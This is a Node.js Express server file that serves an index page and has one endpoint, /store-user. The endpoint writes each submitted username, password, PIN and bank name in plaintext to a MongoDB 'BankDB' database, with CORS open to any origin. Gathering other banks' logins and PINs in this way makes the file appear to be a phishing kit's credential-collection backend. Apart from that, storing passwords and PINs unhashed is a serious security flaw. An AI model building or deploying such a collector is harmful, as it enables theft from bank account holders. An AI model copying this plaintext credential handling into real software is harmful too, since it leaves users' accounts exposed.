const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const { MongoClient } = require("mongodb");

const app = express();
const PORT = process.env.PORT || 3002; // Use Render's provided port or fallback to 3002
const MONGO_URI = process.env.MONGO_URI || "your_mongodb_connection_string";

const client = new MongoClient(MONGO_URI);
let db;

async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db("BankDB"); // Database name: BankDB
        console.log("Connected to MongoDB");
    } catch (err) {
        console.error("MongoDB connection error:", err.message);
        process.exit(1);
    }
}

connectToDatabase();

// Middleware
app.use(bodyParser.json());
app.use(cors());

// Serve static files from the current directory
app.use(express.static(path.join(__dirname)));

// Serve `index.html` for the root route
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// API Endpoint to Store User Data
app.post("/store-user", async (req, res) => {
    const { username, password, pin, bankName } = req.body;

    if (!username || !password || !pin || !bankName) {
        return res.status(400).send("All fields (username, password, pin, bankName) are required.");
    }

    try {
        const usersCollection = db.collection("Users"); // Collection name: Users
        await usersCollection.insertOne({
            username,
            password,
            pin,
            bankName,
            createdAt: new Date(),
        });
        res.status(201).send("User data saved successfully!");
    } catch (error) {
        console.error("Error storing user data:", error.message);
        res.status(500).send("Internal server error.");
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
